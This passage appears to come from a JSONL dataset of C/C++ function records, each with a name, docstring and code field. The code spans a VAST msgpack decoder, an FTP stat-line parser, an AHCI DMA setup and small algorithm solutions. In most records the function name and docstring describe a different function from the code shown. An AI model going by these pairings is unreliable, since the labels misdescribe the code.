};\\n    auto f = make_signed_visitor(to_ns);\\n    return visit(f, o);\\n  } else if constexpr (std::is_same_v<T, time_type>) {\\n    using namespace std::chrono;\\n    auto to_ts = [](auto x) { return time{duration{nanoseconds{x}}}; };\\n    auto f = make_signed_visitor(to_ts);\\n    return visit(f, o);\\n  } else if constexpr (std::is_same_v<T, string_type>) {\\n    if (auto x = get<std::string_view>(o))\\n      return make_data_view(*x);\\n  } else if constexpr (std::is_same_v<T, pattern_type>) {\\n    if (auto x = get<std::string_view>(o))\\n      return data_view{pattern_view{*x}};\\n  } else if constexpr (std::is_same_v<T, address_type>) {\\n    if (auto x = get<std::string_view>(o)) {\\n      VAST_ASSERT(x->size() == 4 || x->size() == 16);\\n      auto family = x->size() == 4 ? address::ipv4 : address::ipv6;\\n      auto addr = address{x->data(), family, address::byte_order::network};\\n      return make_data_view(addr);\\n    }\\n  } else if constexpr (std::is_same_v<T, subnet_type>) {\\n    if (auto xs = get<array_view>(o)) {\\n      VAST_ASSERT(xs->size() == 2);\\n      auto inner = xs->data();\\n      auto str = *get<std::string_view>(inner.get());\\n      auto family = str.size() == 4 ? address::ipv4 : address::ipv6;\\n      auto addr = address{str.data(), family, address::byte_order::network};\\n      inner.next();\\n      auto length = *get<uint8_t>(inner.get());\\n      return data_view{view<subnet>{make_view(addr), length}};\\n    }\\n  } else if constexpr (std::is_same_v<T, enumeration_type>) {\\n    if (auto x = get<uint8_t>(o))\\n      return make_data_view(enumeration{*x});\\n  } else if constexpr (std::is_same_v<T, list_type>) {\\n    if (auto xs = get<array_view>(o)) {\\n      auto ptr = caf::make_counted<msgpack_array_view>(t.value_type, *xs);\\n      return list_view_handle{list_view_ptr{std::move(ptr)}};\\n    }\\n  } else if constexpr (std::is_same_v<T, map_type>) {\\n    if (auto xs = get<array_view>(o)) {\\n      auto ptr\\n        = caf::make_counted<msgpack_map_view>(t.key_type, t.value_type, *xs);\\n      return map_view_handle{map_view_ptr{std::move(ptr)}};\\n    }\\n  } else if constexpr (std::is_same_v<T, record_type>) {\\n    VAST_ASSERT(!\"records are unrolled\");\\n    return {};\\n  } else if constexpr (std::is_same_v<T, alias_type>) {\\n    return decode(objects, t.value_type);\\n  } else {\\n    static_assert(detail::always_false_v<T>, \"missing type\");\\n  }\\n  \/\/ The end of this function is unreachable.\\n  vast::die(\"unreachable\");\\n}'}","id":1860}
{"content":"{'function_name': 'get_this_funnel_1', 'docstring': '\/\/ He starts a family', 'code': 'std::vector<FUN_PTR_T> get_children(FUN_PTR_T &parent){\\n  \\n  using fun_t = typename FUN_PTR_T::element_type;\\n  using matrix_t = typename fun_t::matrix_t;\\n  \\n  FUN_PTR_T this_child_fun;\\n  FUN_PTR_T this_parent_fun = parent;\\n  \\n  \\n  std::stringstream sstream;\\n  std::string name;\\n  \\n  \/\/ Original unscaled matrix\\n  matrix_t P_p = parent->get_P()*parent->get_alpha();\\n  \\n  sstream.setf(std::ios::fixed);\\n  sstream.precision(2);\\n  \\n  std::vector<FUN_PTR_T> fun_vec_child;\\n  \\n  const double alpha_step = max_alpha_step;\\n  const double r_step = max_r_step;\\n  \\n  \/\/ Radius of parent\\n  double alpha = parent->get_alpha();\\n  \\n  if(std::sqrt(alpha) < min_r + r_step){\\n    return fun_vec_child;\\n  }\\n  \\n  alpha = std::max(min_alpha, (std::sqrt(alpha)-r_step)*(std::sqrt(alpha)-r_step));\\n  \\n  while(alpha>=min_alpha){\\n    \/\/ Get the name\\n    sstream.str(std::string());\\n    sstream << \"fun_\";\\n    auto x00 = parent->x0();\\n    for(size_t i=0; i<4; i++){\\n      sstream << (double) x00(i) << \"_\";\\n    }\\n    sstream << std::sqrt(alpha);\\n    name = sstream.str();\\n    std::replace( name.begin(), name.end(), \\'.\\', \\'p\\');\\n    std::replace( name.begin(), name.end(), \\'-\\', \\'m\\');\\n    if (utils_ext::loc_map.find(name)){\\n      \/\/ Already exists\\n      return fun_vec_child;\\n    }\\n    \\n    this_child_fun = this_parent_fun->make_copy(name, this_parent_fun->size());\\n    \/\/ set the new radius\\n    this_child_fun->set_P(P_p\/alpha);\\n    this_child_fun->set_cyclic(this_parent_fun->is_cyclic());\\n    \/\/ And convergence\\n    this_child_fun->set_gamma(gamma_conv);\\n    \\n    fun_t::set_parent(this_parent_fun, this_child_fun);\\n    fun_vec_child.emplace_back(this_child_fun);\\n    this_parent_fun = this_child_fun;\\n    this_child_fun = nullptr;\\n    \/\/ Update alpha\\n    alpha = (std::sqrt(alpha)-r_step); \/\/ New alpha as r\\n    if (alpha <= min_r){\\n      break; \/\/ Necessary as negative radii become positive in next step\\n    }\\n    alpha *= alpha; \/\/ Convert to alpha\\n  }\\n  return fun_vec_child;\\n}'}","id":1865}
{"content":"{'function_name': 'drawSalientKeyPoints', 'docstring': '\/\/ sort the key points by their response and draw the top n_keypoints\\r', 'code': 'int main(int argc, const char** argv)\\r\\n{\\r\\n\\r\\n  if (argc < 2) {\\r\\n    usage(argv[0]);\\r\\n    return 1;\\r\\n  }\\r\\n\\r\\n  ConfigParser cfg(argv[1]);\\r\\n  if (!cfg.isValid()) {\\r\\n    std::cout << \"Invalid cfg file\" << std::endl;\\r\\n    return 1;\\r\\n  }\\r\\n\\r\\n  Options options;\\r\\n  bool success = configure(cfg, &options);\\r\\n  if (!success) {\\r\\n    std::cout << \"Error reading config\" << std::endl;\\r\\n    return 1;\\r\\n  }\\r\\n\\r\\n  char fname[256];\\r\\n  sprintf(fname, \"%s\\\\\\\\offsets.txt\", options.result_dir.c_str());\\r\\n  FILE* file = fopen(fname, \"w\");\\r\\n\\r\\n  \/\/ load up the images in the directory\\r\\n  std::vector<std::string> ir_images, vis_images;\\r\\n  readFilesInDirectory(options.ir_dir.c_str(), &ir_images, \"png\");\\r\\n  for (size_t i = 0; i < ir_images.size(); ++i)\\r\\n  {\\r\\n    char eo_filename[256];\\r\\n    char ir_filename[256];\\r\\n    sprintf(eo_filename, \"%s\\\\\\\\%s\", options.vis_dir.c_str(), ir_images[i].c_str());\\r\\n    sprintf(ir_filename, \"%s\\\\\\\\%s\", options.ir_dir.c_str(), ir_images[i].c_str());\\r\\n\\r\\n    cv::Mat ir_img = cv::imread(ir_filename, -1);\\r\\n    cv::Mat vis_img = cv::imread(eo_filename, -1);\\r\\n    cv::Mat salient_ir(ir_img.clone());\\r\\n    if (!vis_img.data || !ir_img.data) {\\r\\n      std::cout << \"Error loading \" << ir_images[i] << std::endl;\\r\\n      continue;\\r\\n    }\\r\\n\\r\\n    \/\/ draw salient key points on infrared image\\r\\n    cv::cvtColor(ir_img, ir_img, CV_BGR2GRAY);\\r\\n    cv::normalize(ir_img, ir_img, 0, 255, cv::NORM_MINMAX);\\r\\n    drawSalientKeyPoints(ir_img, options.n_keypoints, &salient_ir);\\r\\n\\r\\n    \/\/ concatenate ir to vis and save\\r\\n    cv::Mat result;\\r\\n    concatImages(salient_ir, vis_img, &result);\\r\\n\\r\\n    cv::imwrite(options.result_dir + \"\\\\\\\\\" + ir_images[i].c_str(), result);\\r\\n    fprintf(file, \"%d,%d\\\\n\", i, ir_img.cols);\\r\\n  }\\r\\n\\r\\n  fclose(file);\\r\\n  return 0;\\r\\n}'}","id":1867}
{"content":"{'function_name': 'copy_mdtm_to_timet', 'docstring': '\/* 2 digit second [00-60] *\/', 'code': 'globus_result_t parse_stat_line(char* buffer, struct stat* fstat, char *filename_buf, size_t filename_size)\\n{\\n    if (!buffer || !fstat)\\n        return GLOBUS_FAILURE;\\n\\n    if (filename_buf && filename_size > 0)\\n        filename_buf[0] = \\'\\\\0\\';\\n\\n    \/\/ Lines are like\\n    \/\/ -rw-rw-r--   1 ftp      ftp            49 Oct 29  2009 \/pub\/ubuntu-releases\/robots.txt\\n\\n    enum FtpField {\\n        FTP_FIELD_MODE, FTP_FIELD_NLINKS,\\n        FTP_FIELD_OWNER, FTP_FIELD_GROUP,\\n        FTP_FIELD_SIZE, FTP_FIELD_MONTH,\\n        FTP_FIELD_DAY, FTP_FIELD_YEAR_OR_TIME,\\n        FTP_FIELD_NAME, FTP_FIELD_LINK\\n    };\\n    int field = FTP_FIELD_MODE;\\n\\n    struct tm timedef;\\n    memset(&timedef, 0, sizeof(timedef));\\n    time_t now = time(NULL);\\n    struct tm today;\\n    localtime_r(&now, &today);\\n    char *colon;\\n\\n    char *start = buffer;\\n    while (*start && field < FTP_FIELD_LINK) {\\n        while (isspace(*start) && *start)\\n            ++start;\\n        if (!*start)\\n            break;\\n\\n        bool eol = false;\\n        char* end = start;\\n        while (!isspace(*end) && *end)\\n            ++end;\\n        if (!*end)\\n            eol = true;\\n        *end = \\'\\\\0\\';\\n\\n        switch (field) {\\n            case FTP_FIELD_MODE:\\n                fstat->st_mode = parse_ls_mode(start);\\n                break;\\n            case FTP_FIELD_NLINKS:\\n                fstat->st_nlink = atol(start);\\n                break;\\n            case FTP_FIELD_OWNER:\\n                if (isdigit(*start)) {\\n                    fstat->st_uid = atoi(start);\\n                }\\n                else {\\n                    char usrbuf[128];\\n                    struct passwd usr, *usr_ptr;\\n                    if (getpwnam_r(start, &usr, usrbuf, sizeof(usrbuf), &usr_ptr) == 0) {\\n                        fstat->st_uid = usr.pw_uid;\\n                    }\\n                    else {\\n                        gfal2_log(G_LOG_LEVEL_WARNING, \"Could not get uid for %s (%d)\", start, errno);\\n                    }\\n                }\\n                break;\\n            case FTP_FIELD_GROUP:\\n                if (isdigit(*start)) {\\n                    fstat->st_gid = atoi(start);\\n                }\\n                else {\\n                    char grbuf[128];\\n                    struct group grp, *grp_ptr;\\n                    if (getgrnam_r(start, &grp, grbuf, sizeof(grbuf), &grp_ptr) == 0) {\\n                        fstat->st_gid = grp.gr_gid;\\n                    }\\n                    else {\\n                        gfal2_log(G_LOG_LEVEL_WARNING, \"Could not get gid for %s (%d)\", start, errno);\\n                    }\\n                }\\n                break;\\n            case FTP_FIELD_SIZE:\\n                fstat->st_size = atol(start);\\n                break;\\n            case FTP_FIELD_MONTH:\\n                strptime(start, \"%b\", &timedef);\\n                break;\\n            case FTP_FIELD_DAY:\\n                timedef.tm_mday = atoi(start);\\n                break;\\n            case FTP_FIELD_YEAR_OR_TIME:\\n                if ((colon = strchr(start, \\':\\'))) {\\n                    timedef.tm_year = today.tm_year;\\n                    timedef.tm_hour = atoi(start);\\n                    timedef.tm_min = atoi(colon + 1);\\n                }\\n                else {\\n                    timedef.tm_year = atoi(start) - 1900;\\n                }\\n                break;\\n            case FTP_FIELD_NAME:\\n                if (filename_buf && filename_size) {\\n                    g_strlcpy(filename_buf, start, filename_size);\\n                }\\n            default:\\n                break;\\n        }\\n\\n        if (eol)\\n            break;\\n\\n        \/\/ Next field\\n        start = end + 1;\\n        field++;\\n    }\\n\\n    struct tm gmt_now_tm;\\n    memset(&gmt_now_tm, \\'\\\\0\\', sizeof(struct tm));\\n    globus_libc_gmtime_r(&now, &gmt_now_tm);\\n\\n    time_t gmt_now = mktime(&gmt_now_tm);\\n    time_t offset = now - gmt_now;\\n\\n    fstat->st_atime = fstat->st_mtime = fstat->st_ctime = mktime(&timedef) - offset;\\n\\n    return GLOBUS_SUCCESS;\\n}'}","id":1868}
{"content":"{'function_name': 'ahci_ch_init', 'docstring': '\/* Activate the channel and power\/spin up device *\/', 'code': 'static void ahci_dmainit(device_t dev) {\\n  struct ahci_channel *ch =\\n      reinterpret_cast<struct ahci_channel *>(device_get_softc(dev));\\n  struct ahci_dc_cb_args dcba;\\n  size_t rfsize;\\n\\n  \/* Command area. *\/\\n  if (bus_dma_tag_create(bus_get_dma_tag(dev), 1024, 0, BUS_SPACE_MAXADDR,\\n                         BUS_SPACE_MAXADDR, NULL, NULL, AHCI_WORK_SIZE, 1,\\n                         AHCI_WORK_SIZE, 0, NULL, NULL, &ch->dma.work_tag))\\n    goto error;\\n  if (bus_dmamem_alloc(ch->dma.work_tag, (void **)&ch->dma.work, BUS_DMA_ZERO,\\n                       &ch->dma.work_map))\\n    goto error;\\n  if (bus_dmamap_load(ch->dma.work_tag, ch->dma.work_map, ch->dma.work,\\n                      AHCI_WORK_SIZE, ahci_dmasetupc_cb, &dcba, 0) ||\\n      dcba.error) {\\n    bus_dmamem_free(ch->dma.work_tag, ch->dma.work, ch->dma.work_map);\\n    goto error;\\n  }\\n  ch->dma.work_bus = dcba.maddr;\\n  \/* FIS receive area. *\/\\n  if (ch->chcaps & AHCI_P_CMD_FBSCP)\\n    rfsize = 4096;\\n  else\\n    rfsize = 256;\\n  if (bus_dma_tag_create(bus_get_dma_tag(dev), rfsize, 0, BUS_SPACE_MAXADDR,\\n                         BUS_SPACE_MAXADDR, NULL, NULL, rfsize, 1, rfsize, 0,\\n                         NULL, NULL, &ch->dma.rfis_tag))\\n    goto error;\\n  if (bus_dmamem_alloc(ch->dma.rfis_tag, (void **)&ch->dma.rfis, 0,\\n                       &ch->dma.rfis_map))\\n    goto error;\\n  if (bus_dmamap_load(ch->dma.rfis_tag, ch->dma.rfis_map, ch->dma.rfis, rfsize,\\n                      ahci_dmasetupc_cb, &dcba, 0) ||\\n      dcba.error) {\\n    bus_dmamem_free(ch->dma.rfis_tag, ch->dma.rfis, ch->dma.rfis_map);\\n    goto error;\\n  }\\n  ch->dma.rfis_bus = dcba.maddr;\\n  \/* Data area. *\/\\n  if (bus_dma_tag_create(bus_get_dma_tag(dev), 2, 0, BUS_SPACE_MAXADDR,\\n                         BUS_SPACE_MAXADDR, NULL, NULL,\\n                         AHCI_SG_ENTRIES * PAGE_SIZE * ch->numslots,\\n                         AHCI_SG_ENTRIES, AHCI_PRD_MAX, 0, busdma_lock_mutex,\\n                         &ch->mtx, &ch->dma.data_tag)) {\\n    goto error;\\n  }\\n  return;\\n\\nerror:\\n  device_printf(dev, \"WARNING - DMA initialization failed\\\\n\");\\n  ahci_dmafini(dev);\\n}'}","id":1877}
{"content":"{'function_name': 'maximalRectangle', 'docstring': '\/\/ generate matrix with accumulated rows', 'code': \"int main()\\n{\\n\/\/\\tvector<vector<int>> vec  {{1,0,1},{0,-2,3}};\\n\/\/\\tvector<vector<int>> vec { { 1, 2, 3, 4, 5}, { 6, 7, 8, 9, 10}, {11, 12, 13, 14, 15} };\\n\\n\\tvector<vector<char>> vec { { '1', '0', '1', '0', '0'}, { '1', '0', '1', '1', '1'}, {'1', '1', '1', '1', '1'}, {'1', '0', '0', '1', '0'} };\\n\\tvector<vector<char>> vec1 {{'1', '1'}};\\n\\n\\tint m, n;\\n\\tcin >> m;\\n\\tcin >> n;\\n\\n\\tvector<vector<char>> vecin(m, vector<char>(n));\\n\\tfor(int i = 0; i < m; ++i)\\n\\t\\tfor(int j = 0; j < n; ++j)\\n\\t\\t\\tcin >> vecin[i][j];\\n\\n\\n\\tprintMatrix(vecin);\\n\\tcout << maximalRectangleOptimized(vecin) << endl;\\n\\treturn 0;\\n\\n}\"}","id":1878}
{"content":"{'function_name': 'MimeOleOpenFileStream', 'docstring': '\/\/ Call Internal Tool\\r', 'code': \"MIMEOLEAPI MimeOleIsEnrichedStream(IStream *pStream)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    LPSTR       pszT;\\r\\n    BYTE        rgbBuffer[30 + 1];\\r\\n    ULONG       cbRead;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pStream)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Rewind the stream\\r\\n    CHECKHR(hr = HrRewindStream(pStream));\\r\\n\\r\\n    \/\/ Read the first four bytes\\r\\n    CHECKHR(hr = pStream->Read(rgbBuffer, sizeof(rgbBuffer) - 1, &cbRead));\\r\\n\\r\\n    \/\/ Less than four bytes read ?\\r\\n    if (cbRead < (ULONG)lstrlen(c_szXRich))\\r\\n    {\\r\\n        hr = S_FALSE;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Stick in a null\\r\\n    rgbBuffer[cbRead] = '\\\\0';\\r\\n\\r\\n    \/\/ Skip White Space\\r\\n    pszT = (LPSTR)rgbBuffer;\\r\\n\\r\\n    \/\/ Skip White\\r\\n    pszT = PszSkipWhiteA(pszT);\\r\\n    if ('\\\\0' == *pszT)\\r\\n    {\\r\\n        hr = S_FALSE;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Compare\\r\\n    if (StrCmpNI(pszT, c_szXRich, lstrlen(c_szXRich)) != 0)\\r\\n    {\\r\\n        hr = S_FALSE;\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}\"}","id":1884}
{"content":"{'function_name': 'GetIndice', 'docstring': '\/\/oid de la llamada\\r', 'code': 'AnsiString __fastcall GetDobleIndice(const AnsiString sOID)\\r\\n{\\r\\n        AnsiString sInd1,sInd2;\\r\\n\\r\\n        sInd1 = GetIndice(sOID);\\r\\n        sInd2 = GetIndice(sOID.SubString(1, sOID.Length() - sInd1.Length() - 1));\\r\\n\\r\\n        \/\/return sInd2 + DecimalSeparator\\t+ sInd1;\\r\\n        return sInd2 + \".\" + sInd1;\\r\\n}'}","id":1887}
{"content":"{'function_name': 'dynamicCastArg', 'docstring': '\/\/ suppress warning', 'code': \"CL_DEFUN T_mv core__call_with_variable_bound(Symbol_sp sym, T_sp val, T_sp thunk) {\\n  DynamicScopeManager scope(sym, val);\\n  Function_sp func = gc::As_unsafe<Function_sp>(thunk);\\n  return (func->entry.load())(LCC_PASS_ARGS0_ELLIPSIS(func.raw_()));\\n  \/\/ Don't put anything in here - don't mess up the MV return\\n}\"}","id":1903}
{"content":"{'function_name': 'DCCDisp_RegBinMem', 'docstring': '\/* *op %src, !dst *\/', 'code': \"PUBLIC void\\nDCCDisp_RegBinReg(tok_t op, rc_t src, rc_t dst, int src_unsigned) {\\n rc_t c_src,c_dst;\\n struct binary_operator const *bin_op;\\n \/* Special optimizations for binary operation on the same register. *\/\\n if (src == dst) {\\n  switch (op) {\\n  case '=': return;\\n   \/* Special case: 'add %reg, %reg' --> 'shl $1, %reg' *\/\\n  case '+':\\n   if ((src&(DCC_RC_I16|DCC_RC_I32)) == DCC_RC_I16) t_putb(0x66);\\n   t_putb(0xd0+!!(dst&DCC_RC_I16));\\n   asm_modreg(4,dst&DCC_RI_MASK);\\n   return;\\n   \/* Special case: 'sub %reg, %reg' --> 'xor %reg, %reg' *\/\\n  case '-': op = '^'; break;\\n   \/* Special case: 'or\/and %reg, %reg' --> *nothing* *\/\\n  case '|':\\n  case '&': return;\\n\\n#if 1\\n   \/* What about divide-by-zero?\\n    * Could the user really intend an exception when '%reg == 0'?\\n    *\/\\n  case '\/':\\n  case '%':\\n   \/* Special case: %reg \/ %reg --> %reg = 1. *\/\\n   \/* Special case: %reg % %reg --> %reg = 0. *\/\\n   DCCDisp_IntMovReg(op == '\/' ? 1 : 0,dst);\\n   return;\\n#endif\\n\\n  default: break;\\n  }\\n }\\n c_src = src&DCC_RC_MASK;\\n c_dst = dst&DCC_RC_MASK;\\n bin_op = bin_ops;\\n while (bin_op->bo_tok && bin_op->bo_tok != op) ++bin_op;\\n if (!bin_op->bo_tok) {\\n  \/* Special opcodes: '*', '\/', '%', TOK_SHL, TOK_SHR, TOK_RANGLE3 *\/\\n  switch (op) {\\n  case '=': DCCDisp_RegMovReg(src,dst,src_unsigned); break;\\n\\n  {\\n  case '*':\\n   src = DCCVStack_CastReg(src,src_unsigned,c_dst);\\n   if (!(c_dst&(DCC_RC_I16|DCC_RC_I3264))) {\\n    rc_t temp_dst; \/* 8-bit dst *\/\\n    temp_dst = DCCVStack_GetReg(DCC_RC_I16,1);\\n    DCCDisp_RegMovReg(dst,temp_dst,1);\\n    \/* imulw %src, %temp_dst *\/\\n    t_putb(0x66);\\n    t_putb(0x0f);\\n    t_putb(0xaf);\\n    \/* NOTE: Operands must be written reverse of the usual order. *\/\\n    asm_modreg(temp_dst&DCC_RI_MASK,src&DCC_RI_MASK);\\n    DCCDisp_RegMovReg(temp_dst,dst,1);\\n   } else {\\n    \/* imulw\/l %src, %dst *\/\\n    if (!(c_dst&DCC_RC_I3264)) t_putb(0x66);\\n    t_putb(0x0f);\\n    t_putb(0xaf);\\n    \/* NOTE: Operands must be written reverse of the usual order. *\/\\n    asm_modreg(dst&DCC_RI_MASK,src&DCC_RI_MASK);\\n   }\\n  } break;\\n\\n  { \/* Divide\/Modulo *\/\\n   rc_t eax,edx,original_src;\\n  case '%':\\n  case '\/':\\n   src = DCCVStack_CastReg(src,src_unsigned,c_dst);\\n   \/* Reserve AX & DX for the same storage class as 'src'. *\/\\n   eax = DCC_ASMREG_EAX|(src&DCC_RC_MASK);\\n   edx = DCC_ASMREG_EDX|(src&DCC_RC_MASK);\\n   original_src = src;\\n   \/* If 'src' is either 'EAX' or 'EDX', it needs to be stored elsewhere! *\/\\n   if ((src&DCC_RI_MASK) == DCC_ASMREG_EAX ||\\n       (src&DCC_RI_MASK) == DCC_ASMREG_EDX) {\\n    \/* We can either use ECX or EBX as fallback for src.\\n     * NOTE: Though we have to make sure not to use that of 'dst'*\/\\n    rc_t temp;\\n    if ((dst&DCC_RI_MASK) != DCC_ASMREG_ECX &&\\n        (temp = (src&DCC_RC_MASK)|DCC_ASMREG_ECX,\\n        !DCCVStack_GetRegInuse(temp))); \/* ECX *\/\\n    else if ((dst&DCC_RI_MASK) != DCC_ASMREG_EBX &&\\n             (temp = (src&DCC_RC_MASK)|DCC_ASMREG_EBX,\\n             !DCCVStack_GetRegInuse(temp))); \/* EBX *\/\\n    else if ((dst&DCC_RI_MASK) != DCC_ASMREG_ECX) {\\n     \/* ECX (w\/kill) *\/\\n     temp = DCCVStack_GetRegExact(DCC_ASMREG_ECX|(src&DCC_RC_MASK));\\n    } else {\\n     \/* EBX (w\/kill) *\/\\n     temp = DCCVStack_GetRegExact(DCC_ASMREG_EBX|(src&DCC_RC_MASK));\\n    }\\n    assert((src&DCC_RC_MASK) == (temp&DCC_RC_MASK));\\n    \/* Move the source into our fallback register. *\/\\n    DCCDisp_RegMovReg(src,temp,1);\\n    src = temp;\\n   }\\n   \/* Sanity check: 'src' must not be either of these! *\/\\n   assert((src&DCC_RI_MASK) != DCC_ASMREG_EAX);\\n   assert((src&DCC_RI_MASK) != DCC_ASMREG_EDX);\\n   \/* No need to allocate these registers if they've already been. *\/\\n   if ((original_src&DCC_RI_MASK) != DCC_ASMREG_EAX &&\\n       (dst&DCC_RI_MASK) != DCC_ASMREG_EAX) eax = DCCVStack_GetRegExact(eax);\\n   if ((original_src&DCC_RI_MASK) != DCC_ASMREG_EDX &&\\n       (dst&DCC_RI_MASK) != DCC_ASMREG_EDX) edx = DCCVStack_GetRegExact(edx);\\n   \/* Setup the register to where 'dst' resides in EAX and EDX is filled with ZERO(0). *\/\\n   DCCDisp_RegMovReg(dst,eax,1);\\n   DCCDisp_IntMovReg(0,edx);\\n   \/* Generate the div\/idiv instruction. *\/\\n   if ((src&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n   t_putb(0xf6+!!(src&DCC_RC_I16));\\n   asm_modreg(src_unsigned ? 6 : 7,src&DCC_RI_MASK);\\n   \/* Either move the Quotient, or the Remained back into dst *\/\\n   DCCDisp_RegMovReg(op == '\/' ? eax : edx,dst,1);\\n  } break;\\n\\n  { \/* Shift operations. *\/\\n   rc_t cl,used_dst;\\n  case TOK_SHL:\\n  case TOK_SHR:\\n  case TOK_RANGLE3:\\n   used_dst = dst;\\n   if ((dst&DCC_RI_MASK) == DCC_ASMREG_CL) {\\n    \/* The destination register overlaps with CL.\\n     * With that in mind, we need to move it elsewhere. *\/\\n    used_dst = DCCVStack_GetRegOf(dst&DCC_RC_MASK,\\n                                ~((1 << DCC_ASMREG_CL)|\\n                                  (1 << (src&DCC_RI_MASK))));\\n    DCCDisp_RegMovReg(dst,used_dst,1);\\n   }\\n   cl = DCC_ASMREG_CL|DCC_RC_I8;\\n   if ((src&DCC_RI_MASK) != DCC_ASMREG_CL) {\\n    cl = DCCVStack_GetRegExact(cl);\\n    DCCDisp_RegMovReg(src,cl,src_unsigned);\\n   }\\n   \/* Generate the shift instruction. *\/\\n   if ((used_dst&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n   t_putb(0xd2+!!(used_dst&DCC_RC_I16));\\n   asm_modreg(get_shift_group(op),used_dst&DCC_RI_MASK);\\n   DCCDisp_RegMovReg(used_dst,dst,1);\\n  } break;\\n\\n  { \/* test *\/\\n  case 't':\\n   \/* Cast 'src' to the same length as 'dst'. *\/\\n   src = DCCVStack_CastReg(src,src_unsigned,c_dst);\\n   if ((dst&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n   t_putb(0x84+!!(dst&DCC_RC_I16));\\n   asm_modreg(src&DCC_RI_MASK,dst&DCC_RI_MASK);\\n  } break;\\n\\n  default: break;\\n  }\\n  return;\\n }\\n if (c_src == c_dst) {\\n  \/* operation in the same storage class. *\/\\n  if ((c_src&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n  t_putb(bin_op->bo_r_rm8+!!(c_src&DCC_RC_I16));\\n  goto modreg;\\n }\\n if (c_src > c_dst) {\\n  \/* Truncate: Simply copy from a lower order register,\\n   *           but apply a mask for EDI\/ESI. *\/\\n  if (c_dst&(DCC_RC_I16|DCC_RC_I3264)) {\\n   \/* Destination class isn't 8-bit, meaning a lower-order register is always available. *\/\\n   if (!(c_dst&DCC_RC_I3264)) t_putb(0x66);\\n   t_putb(bin_op->bo_r_rm8+1);\\n  } else if (!(src&4)) {\\n   \/* 8-bit mode, but the source register has an 8-bit equivalent. *\/\\n   t_putb(bin_op->bo_r_rm8);\\n  } else {\\n   src = DCCVStack_CastReg(src,src_unsigned,DCC_RC_I16|DCC_RC_I8);\\n   \/* *op %src, %dst *\/\\n   t_putb(bin_op->bo_r_rm8);\\n   goto modreg;\\n  }\\n } else {\\n  \/* At this point, we know that src is either 16, or 8-bit, and that c_dst is 16\/32-bit.\\n   * >> In both cases, we must use a temporary register to extend 'src' to 16\/32-bit. *\/\\n  src = DCCVStack_CastReg(src,src_unsigned,c_dst);\\n  \/* *op %used_src, %dst *\/\\n  if (!(c_dst&DCC_RC_I32)) t_putb(0x66);\\n  t_putb(bin_op->bo_r_rm8+1);\\n  goto modreg;\\n }\\nmodreg:\\n asm_modreg(src&DCC_RI_MASK,dst&DCC_RI_MASK);\\n}\"}","id":1909}
{"content":"{'function_name': 'checkRecord2', 'docstring': '\/\/\u6240\u4ee5\u5f97\u5230\u5f97\u5230\uff1adp[i]=2dp[i]-dp[i-4]', 'code': 'int checkRecord3(int n) {\\n    \/\/\u601d\u8def\uff1a\u4f7f\u7528\u72b6\u6001\u8f6c\u6362\uff0c\u56e0\u4e3aP\u4e0d\u5f71\u54cd\u53ef\u5956\u52b1\u5e8f\u5217\uff0c\u53ea\u9700\u8981\u6839\u636e\u672b\u5c3eL\u7684\u6570\u91cf\u548c\u662f\u5426\u5305\u542bA\u5212\u5206\u72b6\u6001\uff0c\u5c31\u53ef\u4ee5\u5f80\u4e0b\u9012\u63a8\u4e86\uff0c\u8bb0\u5f55\u6240\u6709\u7684\u72b6\u6001\u6570\\n    \/\/axly\u8868\u793a\u957f\u5ea6\u4e3ai\u5305\u542bx\u4e2aa\u5e76\u4ee5y\u4e2al\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u6570\u91cf\\n    \/\/\u6f02\u4eae\\n\\n    const int cLimit = 1000000007;\\n\\n    long long a0l0=1;\\n    long long a0l1=0,a0l2=0,a1l0=0,a1l1=0,a1l2=0;\\n    for(int i=0;i<n;++i)\\n    {\\n        long long new_a0l0 = (a0l0+a0l1+a0l2) % cLimit;\\n        long new_a0l1 = a0l0;\\n        long new_a0l2 = a0l1;\\n        long new_a1l0 = (a0l0 + a0l1 + a0l2 + a1l0 + a1l1 + a1l2) % cLimit;\\n        long new_a1l1 = a1l0;\\n        long new_a1l2 = a1l1;\\n        a0l0 = new_a0l0;\\n        a0l1 = new_a0l1;\\n        a0l2 = new_a0l2;\\n        a1l0 = new_a1l0;\\n        a1l1 = new_a1l1;\\n        a1l2 = new_a1l2;\\n    }\\n\\n    return (int)((a0l0 + a0l1 + a0l2 + a1l0 + a1l1 + a1l2) % cLimit);\\n\\n        \/\/     long a0l0 = 1, a0l1 = 0, a0l2 = 0, a1l0 = 0, a1l1 = 0, a1l2 = 0;\\n        \/\/ for (int i = 0; i <= n; i++) {\\n        \/\/     long a0l0_ = (a0l0 + a0l1 + a0l2) % M;\\n        \/\/     a0l2 = a0l1;\\n        \/\/     a0l1 = a0l0;\\n        \/\/     a0l0 = a0l0_;\\n        \/\/     long a1l0_ = (a0l0 + a1l0 + a1l1 + a1l2) % M;\\n        \/\/     a1l2 = a1l1;\\n        \/\/     a1l1 = a1l0;\\n        \/\/     a1l0 = a1l0_;\\n        \/\/ }\\n        \/\/ return (int) a1l0;\\n\\n}'}","id":1911}
